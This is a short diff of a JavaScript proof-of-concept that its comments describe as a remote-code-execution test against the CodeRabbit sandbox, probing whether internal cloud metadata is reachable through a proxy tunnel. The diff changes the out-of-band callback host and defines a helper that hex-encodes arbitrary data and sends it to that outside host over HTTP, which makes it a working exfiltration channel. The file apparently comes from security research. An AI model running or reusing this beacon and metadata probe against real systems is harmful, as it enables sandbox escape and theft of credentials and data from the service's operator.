@@ -1,7 +1,7 @@
 // CodeRabbit RCE — DECISIVE: is INTERNAL metadata reachable via the proxy CONNECT tunnel?
 // External tunnel already confirmed (not an escape — sandbox has egress). This tests the
 // internal target the sandbox CANNOT reach directly, using the TLS-over-tunnel pattern that worked.
-var C = 'd8sqd0roeaqo3mkecle08prms7fuffzs9.oast.site';
+var C = 'd8sqtb3oeaqo96sng87gkyzeeacpi6sq4.oast.live';
 var http = require('http'), dns = require('dns'), net = require('net'), tls = require('tls');
 var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
 var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 700), timeout: 9000 }, function () {}).on('error', function () {}); } catch (e) {} };
